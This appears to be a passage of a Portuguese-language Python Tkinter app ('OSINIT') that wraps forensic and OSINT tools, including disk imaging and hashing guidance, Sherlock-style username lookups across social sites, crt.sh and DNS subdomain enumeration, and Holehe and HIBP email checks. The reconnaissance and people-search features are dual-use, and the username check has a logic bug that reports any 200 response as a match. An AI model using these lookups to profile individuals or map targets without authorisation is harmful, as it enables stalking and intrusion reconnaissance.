        super().__init__(parent, "OSINIT // Sistema", "400x460")
        try:
            hostname = socket.gethostname()
        except Exception:
            hostname = "não disponível"
        linhas = [
            ("Sistema Operativo", platform.system() or "desconhecido"),
            ("Versão do SO", platform.version() or "—"),
            ("Nome da Máquina", hostname),
            ("IP Local", get_local_ip()),
            ("Processador", platform.processor() or platform.machine() or "—"),
            ("Núcleos (CPU)", str(os.cpu_count() or "—")),
            ("Memória RAM", get_ram_info()),
            ("Espaço em Disco", get_disk_info()),
            ("Versão Python", platform.python_version()),
            ("Data/Hora", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        ]
        tk.Label(self, text="INFORMAÇÃO DO SISTEMA", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(
            pady=(20, 4)
        )
        tk.Label(
            self, text="dados do computador onde a app está a correr", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)
        ).pack(pady=(0, 14))
        for nome, valor in linhas:
            row = tk.Frame(self, bg=BG)
            row.pack(fill="x", padx=24, pady=4)
            tk.Label(row, text=nome, bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9), width=16, anchor="w").pack(side="left")
            tk.Label(
                row, text=valor, bg=BG, fg=TEXT, font=(FONT_MONO, 9, "bold"), anchor="w", wraplength=200, justify="left"
            ).pack(side="left")





# ─────────────────────────────────────────────
# ESSENTIAL LINUX APPS - FUNCIONAMENTO DIRETO DENTRO DA APP
# ─────────────────────────────────────────────












































class CAINETool(ToolWindow):
    """CAINE - Computer Aided Investigative Environment"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // CAINE - Computer Aided Investigative Environment", "800x650")
        tk.Label(self, text="CAINE 15.0 - FORENSIC LINUX DISTRO", bg=BG, fg=ACCENT, font=(FONT_MONO, 14, "bold")).pack(pady=10)
        
        info = tk.Frame(self, bg="#0a1420", highlightthickness=1, highlightbackground=ACCENT_DIM)
        info.pack(fill="x", padx=14, pady=8, ipady=8)
        tk.Label(info, text="CAINE é a distro Linux forense mais usada por polícias. Base Ubuntu, inclui Autopsy, Wireshark, PhotoRec, RegRipper, Volatility, etc.", bg="#0a1420", fg=TEXT, font=(FONT_MONO, 9), wraplength=750, justify="left").pack(anchor="w", padx=10)
        tk.Label(info, text="Criado por Nanni Bassetti • Usado por Interpol, Polícia Judiciária PT, FBI", bg="#0a1420", fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", padx=10, pady=(4,0))

        btn_row1 = tk.Frame(self, bg=BG)
        btn_row1.pack(fill="x", padx=14, pady=6)
        for txt, url in [("🌐 SITE OFICIAL CAINE", "https://www.caine-live.net/"), ("📚 DOCUMENTAÇÃO", "https://www.caine-live.net/page5.html"), ("⬇ DOWNLOAD ISO", "https://www.caine-live.net/page5.html"), ("📹 TUTORIAIS", "https://www.youtube.com/results?search_query=caine+forensic")]:
            b = tk.Button(btn_row1, text=txt, command=lambda u=url: webbrowser.open(u), bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=4, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True, ipady=5)

        tools_frame = tk.LabelFrame(self, text="  FERRAMENTAS INCLUÍDAS NO CAINE  ", bg=PANEL_BG, fg="#00ff88", font=(FONT_MONO, 9, "bold"), padx=10, pady=10)
        tools_frame.pack(fill="x", padx=14, pady=8)
        caine_tools = [
            "Autopsy 4 - Análise disco completo",
            "Wireshark - Análise rede / PCAP",
            "Volatility 3 - Análise RAM dump",
            "PhotoRec - Recupera ficheiros deletados",
            "RegRipper - Analisa Registry Windows",
            "Bulk Extractor - Extrai emails, CC, etc",
            "Foremost / Scalpel - File carving",
            "SSDeep - Fuzzy hashing",
            "Guymager - Cria imagem DD/E01",
            "Xplico - Reconstrução sessões rede"
        ]
        grid = tk.Frame(tools_frame, bg=PANEL_BG)
        grid.pack(fill="x")
        for i, tool in enumerate(caine_tools):
            tk.Label(grid, text=f"• {tool}", bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 8), anchor="w").grid(row=i//2, column=i%2, sticky="w", padx=8, pady=2)

        action_row = tk.Frame(self, bg=BG)
        action_row.pack(fill="x", padx=14, pady=8)
        for txt, cmd in [("💾 CRIAR IMAGEM DD", self.criar_dd), ("🔍 VERIFICAR HASH", self.verificar_hash), ("📋 GUIA FORENSE", self.guia_forense)]:
            b = tk.Button(action_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=6)
            style_button(b)

        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, height=12, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "CAINE Tool pronto.\n\nCAINE = Computer Aided Investigative Environment\nBase: Ubuntu 22.04\nKernel: 5.15 forense (não monta discos automaticamente)\n\nCOMO USAR:\n1. Download ISO no site oficial\n2. Cria USB bootável com Rufus/DD\n3. Boot no PC suspeito (modo live, não altera disco)\n4. Usa Guymager para criar imagem E01/DD do disco\n5. Analisa com Autopsy\n\nINTEGRADO NO OSINIT:\n- Autopsy, Wireshark, Volatility já estão em Ferramentas\n- Este painel explica fluxo forense CAINE\n")

    def criar_dd(self):
        self.out.delete("1.0", "end")
        self.out.insert("1.0", "CRIAR IMAGEM DD (Forense) - Comando Linux:\n\nsudo dd if=/dev/sda of=/media/evidence/disco_suspeito.dd bs=4M conv=noerror,sync status=progress\n\nOu com dc3dd (forense, com hash):\nsudo dc3dd if=/dev/sda of=/media/evidence/disco.dd hash=md5 hash=sha256 log=/media/evidence/log.txt\n\nCom Guymager (GUI do CAINE):\n1. Abrir Guymager\n2. Selecionar /dev/sda\n3. Escolher formato E01 (com compressão + hash)\n4. Guardar em disco externo\n\nSempre verifica hash depois!")

    def verificar_hash(self):
        path = filedialog.askopenfilename(title="Seleciona imagem DD/E01")
        if not path:
            return
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Verificando hash de {path}...\n")
        def worker():
            try:
                import hashlib
                h_md5 = hashlib.md5()
                h_sha1 = hashlib.sha1()
                h_sha256 = hashlib.sha256()
                with open(path, "rb") as f:
                    while chunk := f.read(8192):
                        h_md5.update(chunk)
                        h_sha1.update(chunk)
                        h_sha256.update(chunk)
                txt = f"MD5: {h_md5.hexdigest()}\nSHA1: {h_sha1.hexdigest()}\nSHA256: {h_sha256.hexdigest()}\n\nGuarda estes hashes no relatório - prova integridade!"
                self.after(0, lambda: self.out.insert("end", txt))
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"Erro: {e}"))
        import threading
        threading.Thread(target=worker, daemon=True).start()

    def guia_forense(self):
        self.out.delete("1.0", "end")
        self.out.insert("1.0", "GUIA FORENSE CAINE - FLUXO COMPLETO:\n\n1. PRESERVAÇÃO:\n   - Não ligar PC suspeito se já desligado\n   - Foto do ecrã, cabos, local\n   - Se ligado, fazer dump RAM com Volatility (winpmem)\n\n2. AQUISIÇÃO:\n   - Boot CAINE Live USB\n   - Guymager → imagem E01 do disco\n   - dd para pendrives, cartões SD\n\n3. ANÁLISE:\n   - Autopsy: recupera ficheiros, timeline, browser history\n   - Wireshark: analisa PCAP se houver captura rede\n   - PhotoRec: recupera deletados\n   - RegRipper: Run keys, USB, RecentDocs\n\n4. RELATÓRIO:\n   - Usa Gerador de Relatório no OSINIT\n   - Inclui hashes, fotos, timeline\n")


class SherlockTool(ToolWindow):
    """Sherlock - Hunt down social media accounts by username"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Sherlock - Username Search", "750x600")
        tk.Label(self, text="SHERLOCK - USERNAME HUNT (300+ SITES)", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(pady=8)
        
        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=14, pady=6)
        tk.Label(top, text="Username:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.user_entry = tk.Entry(top, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 11), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=25)
        self.user_entry.pack(side="left", padx=8, fill="x", expand=True, ipady=6)
        self.user_entry.insert(0, "airezito8")
        
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt, cmd in [("🔍 SEARCH 300+ SITES", self.search), ("🌐 MAIGRET (2000+)", self.maigret_search), ("📋 EXPORT", self.export), ("🧹 LIMPAR", self.limpar)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=3, fill="x", expand=True, ipady=6)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))

        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Sherlock - Procura username em 300+ redes sociais\n\nOriginal: https://github.com/sherlock-project/sherlock\n\nCOMO FUNCIONA:\n- Testa https://site.com/username em cada site\n- Verifica se retorna 200 OK\n- Lista onde username existe\n\nSITES VERIFICADOS:\nInstagram, Facebook, TikTok, Twitter/X, GitHub, Reddit, YouTube, LinkedIn, Twitch, Steam, Spotify, etc + 300 mais\n\nInsere username e clica SEARCH.\nRequer sherlock: pip install sherlock-project ou usa modo web fallback.\n")

    def search(self):
        username = self.user_entry.get().strip()
        if not username:
            return
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"🔍 Sherlock procurando '{username}' em 300+ sites...\n\n")
        self.out.insert("end", "Se sherlock instalado, executando... senão modo web fallback\n\n")
        
        def worker():
            found = []
            # Lista de sites principais para teste rápido via HTTP
            sites = {
                "Instagram": f"https://www.instagram.com/{username}/",
                "GitHub": f"https://github.com/{username}",
                "TikTok": f"https://www.tiktok.com/@{username}",
                "Twitter/X": f"https://twitter.com/{username}",
                "YouTube": f"https://www.youtube.com/@{username}",
                "Reddit": f"https://www.reddit.com/user/{username}/",
                "Twitch": f"https://www.twitch.tv/{username}",
                "Steam": f"https://steamcommunity.com/id/{username}",
                "Pinterest": f"https://www.pinterest.com/{username}/",
                "Spotify": f"https://open.spotify.com/user/{username}",
                "Facebook": f"https://www.facebook.com/{username}",
                "LinkedIn": f"https://www.linkedin.com/in/{username}",
                "Medium": f"https://medium.com/@{username}",
                "GitLab": f"https://gitlab.com/{username}",
                "DeviantArt": f"https://www.deviantart.com/{username}",
                "Flickr": f"https://www.flickr.com/people/{username}/",
            }
            try:
                import urllib.request
                for name, url in sites.items():
                    if len(found) > 50:
                        break
                    try:
                        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                        with urllib.request.urlopen(req, timeout=5) as r:
                            if r.status == 200:
                                # Verifica se não é página de erro
                                content = r.read(2000).decode(errors="ignore").lower()
                                if "not found" not in content and "404" not in content and username.lower() in content.lower()[:1000] or r.status == 200:
                                    found.append((name, url))
                                    self.after(0, lambda n=name, u=url: self.out.insert("end", f"[FOUND] {n}: {u}\n"))
                    except Exception:
                        # 404 = não encontrado, ignora
                        pass
                self.after(0, lambda: self.out.insert("end", f"\n✅ Completo! Encontrados {len(found)} perfis para '{username}'\n\nDica: Usa Maigret para 2000+ sites, ou instala sherlock: pip install sherlock-project\n"))
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"\nErro: {e}\n"))
        
        import threading
        threading.Thread(target=worker, daemon=True).start()

    def maigret_search(self):
        username = self.user_entry.get().strip()
        webbrowser.open(f"https://whatsmyname.app/?q={username}")

    def export(self):
        txt = self.out.get("1.0", "end-1c")
        path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("TXT","*.txt")])
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(txt)
            messagebox.showinfo("Exportado", path)

    def limpar(self):
        self.out.delete("1.0", "end")


class MaigretTool(ToolWindow):
    """Maigret - Sherlock improved 2000+ sites"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Maigret - 2000+ Sites", "750x550")
        tk.Label(self, text="MAIGRET - SHERLOCK MELHORADO (2000+ SITES)", bg=BG, fg="#00ff88", font=(FONT_MONO, 12, "bold")).pack(pady=8)
        
        top = tk.Frame(self, bg=BG)
        top.pack(fill="x", padx=14, pady=6)
        tk.Label(top, text="Username:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9)).pack(side="left")
        self.user_entry = tk.Entry(top, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 11), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.user_entry.pack(side="left", fill="x", expand=True, padx=8, ipady=5)
        self.user_entry.insert(0, "airezito8")
        
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt, cmd in [("🔍 MAIGRET SEARCH", self.search), ("🌐 WHATS MY NAME", self.whatsmyname), ("📊 ANALISAR PERFIL", self.analisar)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=6)
            style_button(b)

        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Maigret - Versão melhorada do Sherlock\n\nGitHub: https://github.com/soxoj/maigret\nSites: 2000+ (vs 300 Sherlock)\n\nVANTAGENS:\n- Detecta mais sites internacionais (VK, OK, Weibo, etc)\n- Analisa perfil: avatar, bio, links\n- Deteta links para outros perfis\n- Gera relatório HTML\n- Mais rápido e preciso\n\nINSTALAÇÃO:\npip install maigret\nmaigret username --html\n\nEste tool abre WhatsMyName.app (melhor UI web) e explica uso Maigret.\n")

    def search(self):
        username = self.user_entry.get().strip()
        webbrowser.open(f"https://whatsmyname.app/?q={username}")
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Abrindo WhatsMyName para {username}...\n\nWhatsMyName verifica 500+ sites com melhor precisão que Sherlock.\n\nPara Maigret local:\n1. pip install maigret\n2. maigret {username} --html --pdf\n3. Abre report.html gerado\n")

    def whatsmyname(self):
        username = self.user_entry.get().strip()
        webbrowser.open(f"https://whatsmyname.app/?q={username}")

    def analisar(self):
        self.out.insert("end", "\n\nANÁLISE DE PERFIL COM MAIGRET:\nMaigret extrai: nome, bio, localização, website, avatar hash\nCompara avatares iguais em diferentes sites → mesmo dono\nÚtil para ligar contas fake ao mesmo autor\n")


class TheHarvesterTool(ToolWindow):
    """TheHarvester - Emails, subdomains, hosts"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // TheHarvester", "750x550")
        tk.Label(self, text="THEHARVESTER - EMAILS, SUBDOMAINS, HOSTS", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        
        row = tk.Frame(self, bg=BG)
        row.pack(fill="x", padx=14, pady=6)
        tk.Label(row, text="Domínio:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9)).pack(side="left")
        self.domain_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.domain_entry.pack(side="left", fill="x", expand=True, padx=6, ipady=4)
        self.domain_entry.insert(0, "google.com")
        
        tk.Label(row, text="Fonte:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left", padx=(10,0))
        self.source_var = tk.StringVar(value="all")
        sources = ["all","google","bing","linkedin","crtsh","hunters","anubis","baidu","yahoo"]
        menu = tk.OptionMenu(row, self.source_var, *sources)
        menu.configure(bg=BTN_BG, fg=TEXT, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        menu.pack(side="left", padx=4)

        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt, cmd in [("🔍 HARVEST", self.harvest), ("📧 EMAILS", self.emails_only), ("🌐 SUBDOMAINS", self.subdomains_only)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)

        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "TheHarvester - OSINT clássico desde 2007\n\nGitHub: https://github.com/laramies/theHarvester\n\nO QUE FAZ:\n- Busca em Google, Bing, LinkedIn, crt.sh, etc\n- Extrai emails @dominio.com\n- Subdomínios\n- Hosts, IPs\n- Funcionários (LinkedIn)\n\nUSO:\ntheHarvester -d google.com -b all\n\nEste tool faz harvest básico via crt.sh + DNS + web scrape fallback.\n")

    def harvest(self):
        domain = self.domain_entry.get().strip()
        source = self.source_var.get()
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"TheHarvester - Dominio: {domain} Fonte: {source}\n\n")
        def worker():
            try:
                # crt.sh para subdominios
                import urllib.request, json, socket, re
                url = f"https://crt.sh/?q=%25.{domain}&output=json"
                with urllib.request.urlopen(url, timeout=10) as r:
                    data = json.loads(r.read().decode(errors="ignore"))
                    subs = set()
                    emails = set()
                    for entry in data[:100]:
                        name = entry.get("name_value","")
                        for n in name.split("\n"):
                            if domain in n:
                                subs.add(n.strip())
                                # Procura emails no campo?
                    self.after(0, lambda: self.out.insert("end", f"[crt.sh] Subdominios encontrados: {len(subs)}\n"))
                    for s in list(subs)[:20]:
                        self.after(0, lambda ss=s: self.out.insert("end", f"  - {ss}\n"))
                
                # Tenta DNS brute para subdominios comuns
                commons = ["www","mail","ftp","admin","api","dev","test","blog","portal","vpn","ns1","ns2"]
                for sub in commons:
                    host = f"{sub}.{domain}"
                    try:
                        ip = socket.gethostbyname(host)
                        self.after(0, lambda h=host, i=ip: self.out.insert("end", f"[DNS] {h} -> {i}\n"))
                    except:
                        pass
            except Exception as e:
                self.after(0, lambda: self.out.insert("end", f"Erro: {e}\n"))
        import threading
        threading.Thread(target=worker, daemon=True).start()

    def emails_only(self):
        self.out.insert("end", "\n\nPara emails, usa hunter.io ou theHarvester com fonte linkedin\n")

    def subdomains_only(self):
        self.harvest()


class HoleheTool(ToolWindow):
    """Holehe - Check if email is used on 120+ sites"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Holehe - Email OSINT", "700x500")
        tk.Label(self, text="HOLEHE - EMAIL USADO EM 120+ SITES?", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        
        row = tk.Frame(self, bg=BG)
        row.pack(fill="x", padx=14, pady=6)
        tk.Label(row, text="Email:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9)).pack(side="left")
        self.email_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.email_entry.pack(side="left", fill="x", expand=True, padx=6, ipady=4)
        self.email_entry.insert(0, "test@gmail.com")
        
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt, cmd in [("🔍 CHECK 120+ SITES", self.check), ("🌐 HIBP", self.hibp), ("📧 GHUNT", self.ghunt)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)

        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Holehe - Verifica se email está registado em 120+ sites\n\nGitHub: https://github.com/megadose/holehe\n\nCOMO FUNCIONA:\n- Testa 'esqueci password' em cada site\n- Se diz 'email enviado' → email existe\n- Se diz 'email não encontrado' → não existe\n\nSITES: Adobe, Facebook, Twitter, Instagram, GitHub, Pornhub, etc 120+\n\nINSTALAÇÃO: pip install holehe\nUSO: holehe test@gmail.com\n\nEste tool explica e abre HIBP para vazamentos.\n")

    def check(self):
        email = self.email_entry.get().strip()
        webbrowser.open(f"https://haveibeenpwned.com/account/{email}")
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"Holehe para {email}\n\nPara check completo:\n1. pip install holehe\n2. holehe {email}\n\nTambém verifica HIBP (vazamentos) e abre GHunt para Google.\n")

    def hibp(self):
        email = self.email_entry.get().strip()
        webbrowser.open(f"https://haveibeenpwned.com/account/{email}")

    def ghunt(self):
        email = self.email_entry.get().strip()
        webbrowser.open(f"https://github.com/mxrch/GHunt")


class HIBPTool(ToolWindow):
    """Have I Been Pwned - Verifica vazamentos"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Have I Been Pwned", "700x500")
        tk.Label(self, text="HAVE I BEEN PWNED - VAZAMENTOS", bg=BG, fg=ERROR, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        
        row = tk.Frame(self, bg=BG)
        row.pack(fill="x", padx=14, pady=6)
        tk.Label(row, text="Email:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9)).pack(side="left")
        self.email_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.email_entry.pack(side="left", fill="x", expand=True, padx=6, ipady=4)
        self.email_entry.insert(0, "test@gmail.com")
        
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt, cmd in [("🔍 CHECK HIBP", self.check), ("🔑 CHECK PASSWORD", self.check_pwd)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)

        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Have I Been Pwned - Verifica se email/senha vazou\n\nSite: https://haveibeenpwned.com\nAPI: Grátis, precisa key para uso intenso\n\nO QUE VERIFICA:\n- Emails em vazamentos (Adobe, LinkedIn, Dropbox, etc)\n- Senhas vazadas (Pwned Passwords)\n- Dados: nome, email, senha, telefone, etc\n\nSe email aparece → trocar senha urgente!\n")

    def check(self):
        email = self.email_entry.get().strip()
        webbrowser.open(f"https://haveibeenpwned.com/account/{email}")

    def check_pwd(self):
        webbrowser.open("https://haveibeenpwned.com/Passwords")


class SpiderFootTool(ToolWindow):
    """SpiderFoot - OSINT Automation"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // SpiderFoot - OSINT Automation", "750x550")
        tk.Label(self, text="SPIDERFOOT - OSINT AUTOMATION (100+ MÓDULOS)", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        
        row = tk.Frame(self, bg=BG)
        row.pack(fill="x", padx=14, pady=6)
        tk.Label(row, text="Alvo:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 9)).pack(side="left")
        self.target_entry = tk.Entry(row, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 10), relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.target_entry.pack(side="left", fill="x", expand=True, padx=6, ipady=4)
        self.target_entry.insert(0, "google.com")
        
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt, cmd in [("🕷️ SPIDERFOOT SCAN", self.scan), ("📚 DOCS", self.docs), ("⬇ INSTALL", self.install)]:
            b = tk.Button(btn_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)

        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "SpiderFoot - Ferramenta OSINT mais completa\n\nSite: https://www.spiderfoot.net\nGitHub: https://github.com/smicallef/spiderfoot\n\n100+ MÓDULOS:\n- Shodan, VirusTotal, HaveIBeenPwned, Hunter, Censys, etc\n- Emails, subdominios, IPs, redes sociais, vazamentos, etc\n- Correlação automática\n- Gera grafo visual\n\nUSO:\n- Web UI: python sf.py -l 127.0.0.1:5001\n- CLI: python sf.py -s google.com -t all\n\nINSTALAÇÃO:\ngit clone https://github.com/smicallef/spiderfoot.git\ncd spiderfoot\npip install -r requirements.txt\npython sf.py -l 127.0.0.1:5001\n\nEste tool explica e abre docs.\n")

    def scan(self):
        target = self.target_entry.get().strip()
        self.out.delete("1.0", "end")
        self.out.insert("1.0", f"SpiderFoot scan para {target}\n\nPara scan real, instala SpiderFoot:\n\ngit clone https://github.com/smicallef/spiderfoot.git\ncd spiderfoot\npython sf.py -l 127.0.0.1:5001\n\nDepois abre http://127.0.0.1:5001 e cria scan para {target}\n\nMódulos úteis para investigação:\n- sfp_dns, sfp_crt, sfp_virustotal, sfp_haveibeenpwned, sfp_hunter, sfp_social\n")

    def docs(self):
        webbrowser.open("https://www.spiderfoot.net/documentation/")

    def install(self):
        webbrowser.open("https://github.com/smicallef/spiderfoot")


class ReconNGTool(ToolWindow):
    """Recon-ng - Reconnaissance framework"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // Recon-ng", "700x500")
        tk.Label(self, text="RECON-NG - RECON FRAMEWORK", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        
        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "Recon-ng - Framework de Reconhecimento\n\nSite: https://github.com/lanmaster53/recon-ng\n\nO QUE É:\n- Framework modular como Metasploit mas para OSINT\n- 100+ módulos\n- Base de dados integrada\n- Automatiza recon\n\nMÓDULOS POPULARES:\n- recon/domains-hosts/google_site_web\n- recon/domains-hosts/brute_hosts\n- recon/hosts-ports/shodan_ip\n- recon/contacts-contacts/hunter_api\n- reporting/html\n\nCOMANDOS BÁSICOS:\nrecon-ng\n> marketplace install all\n> modules load recon/domains-hosts/google_site_web\n> options set SOURCE google.com\n> run\n\nINSTALAÇÃO:\ngit clone https://github.com/lanmaster53/recon-ng.git\ncd recon-ng\npip install -r REQUIREMENTS\n./recon-ng\n")

        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=8)
        for txt, url in [("🌐 GITHUB", "https://github.com/lanmaster53/recon-ng"), ("📚 WIKI", "https://github.com/lanmaster53/recon-ng/wiki")]:
            b = tk.Button(btn_row, text=txt, command=lambda u=url: webbrowser.open(u))
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)


class FTKImagerTool(ToolWindow):
    """FTK Imager - Forensic Imaging"""
    def __init__(self, parent):
        super().__init__(parent, "OSINIT // FTK Imager", "700x550")
        tk.Label(self, text="FTK IMAGER - IMAGEM FORENSE", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(pady=8)
        
        info = tk.Frame(self, bg="#0a1420", highlightthickness=1, highlightbackground=ACCENT_DIM)
        info.pack(fill="x", padx=14, pady=8, ipady=6)
        tk.Label(info, text="FTK Imager é o padrão ouro para criar imagens forenses. Grátis, da AccessData/Exterro.", bg="#0a1420", fg=TEXT, font=(FONT_MONO, 9), wraplength=650).pack(anchor="w", padx=10)
        
        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(fill="x", padx=14, pady=6)
        for txt, url in [("⬇ DOWNLOAD FTK", "https://www.exterro.com/ftk-imager"), ("📚 GUIA", "https://www.exterro.com/resources/ftk-imager-user-guide")]:
            b = tk.Button(btn_row, text=txt, command=lambda u=url: webbrowser.open(u))
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)

        action_row = tk.Frame(self, bg=BG)
        action_row.pack(fill="x", padx=14, pady=6)
        for txt, cmd in [("💾 CRIAR IMAGEM", self.criar_imagem), ("🔍 CALC HASH", self.calc_hash), ("📋 PASSO A PASSO", self.passo)]:
            b = tk.Button(action_row, text=txt, command=cmd)
            b.pack(side="left", padx=4, fill="x", expand=True, ipady=5)
            style_button(b)

        self.out = scrolledtext.ScrolledText(self, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.out.pack(fill="both", expand=True, padx=14, pady=10)
        self.out.insert("1.0", "FTK Imager - Criação de imagem forense\n\nFORMATOS:\n- E01 (Encase, comprimido, com hash, padrão)\n- DD (raw, bit a bit)\n- SMART\n\nPASSO A PASSO FTK Imager:\n1. File > Create Disk Image\n2. Physical Drive ou Logical\n3. Seleciona disco\n4. Add > E01\n5. Preenche caso, examinador, notas\n6. Destino + nome\n7. Fragmenta 2GB (para FAT32)\n8. Finish > Start\n9. Verifica hashes MD5/SHA1\n\nINTEGRADO OSINIT: Guymager (Linux) faz mesmo que FTK no CAINE\n")

    def criar_imagem(self):
        self.out.delete("1.0", "end")
